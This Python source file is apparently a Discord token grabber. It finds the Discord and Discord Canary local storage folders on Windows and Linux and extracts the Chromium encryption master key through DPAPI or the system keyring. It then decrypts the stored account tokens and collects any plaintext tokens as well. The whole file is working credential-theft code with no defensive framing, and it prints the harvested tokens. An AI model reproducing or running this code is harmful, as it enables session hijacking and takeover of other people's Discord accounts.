from Cryptodome.Cipher import AES
import os
import sys
import json
import re
import base64
import hashlib

IS_WINDOWS = sys.platform == 'win32'

if IS_WINDOWS:
    from win32crypt import CryptUnprotectData

class Discord(object):

    def __init__(self):
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.unencrypted_regex = r"[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}"
        self.tokens = []

        self.grab_tokens()

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            raise Exception("Failed to decrypt token")

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()

        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]

        if IS_WINDOWS:
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        else:
            # On Linux, Electron/Chromium uses a password from the system keyring
            # or falls back to "peanuts" as the default password.
            # Key is derived via PBKDF2 with salt "saltysalt" and 1 iteration.
            password = b"peanuts"
            try:
                import secretstorage
                connection = secretstorage.dbus_init()
                collection = secretstorage.get_default_collection(connection)
                for item in collection.get_all_items():
                    if item.get_label() in ("Chromium Safe Storage", "Chrome Safe Storage", "Discord Safe Storage"):
                        password = item.get_secret()
                        break
            except Exception:
                pass
            master_key = hashlib.pbkdf2_hmac("sha1", password, b"saltysalt", 1, dklen=16)

        return master_key

    def _get_discord_paths(self):
        """Return dict of {name: leveldb_path} and a function to get Local State path."""
        if IS_WINDOWS:
            roaming = os.getenv("appdata")
            return {
                'Discord': os.path.join(roaming, 'discord', 'Local Storage', 'leveldb'),
                'Discord Canary': os.path.join(roaming, 'discordcanary', 'Local Storage', 'leveldb'),
            }
        else:
            config = os.path.join(os.path.expanduser("~"), ".config")
            return {
                'Discord': os.path.join(config, 'discord', 'Local Storage', 'leveldb'),
                'Discord Canary': os.path.join(config, 'discordcanary', 'Local Storage', 'leveldb'),
            }

    def _get_local_state_path(self, name):
        disc = name.replace(" ", "").lower()
        if IS_WINDOWS:
            roaming = os.getenv("appdata")
            return os.path.join(roaming, disc, 'Local State')
        else:
            config = os.path.join(os.path.expanduser("~"), ".config")
            return os.path.join(config, disc, 'Local State')

    def _decrypt_linux_v10(self, encrypted_value, master_key):
        """Decrypt Chromium v10/v11 encrypted values on Linux (AES-CBC)."""
        encrypted_value = encrypted_value[3:]  # strip "v10" or "v11" prefix
        iv = b" " * 16
        cipher = AES.new(master_key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(encrypted_value)
        # Remove PKCS padding
        padding_len = decrypted[-1]
        if isinstance(padding_len, int) and 1 <= padding_len <= 16:
            decrypted = decrypted[:-padding_len]
        return decrypted.decode("utf-8", errors="ignore")

    def grab_tokens(self):
        paths = self._get_discord_paths()

        for name, path in paths.items():
            if not os.path.exists(path):
                continue

            local_state = self._get_local_state_path(name)
            has_local_state = os.path.exists(local_state)

            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue

                filepath = os.path.join(path, file_name)
                with open(filepath, errors='ignore') as f:
                    lines = f.readlines()

                for line in lines:
                    line = line.strip()
                    if not line:
                        continue

                    # Try encrypted tokens (Windows GCM style)
                    if has_local_state:
                        for y in re.findall(self.encrypted_regex, line):
                            try:
                                raw = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])
                                master_key = self.get_master_key(local_state)

                                if not IS_WINDOWS and raw[:3] in (b"v10", b"v11"):
                                    token = self._decrypt_linux_v10(raw, master_key)
                                else:
                                    token = self.decrypt_val(raw, master_key)

                                if token and token not in self.tokens:
                                    self.tokens.append(token)
                            except Exception:
                                pass

                    # Try unencrypted tokens
                    for match in re.findall(self.unencrypted_regex, line):
                        if match not in self.tokens:
                            self.tokens.append(match)

if __name__ == '__main__':
    discord = Discord()
    print(discord.tokens)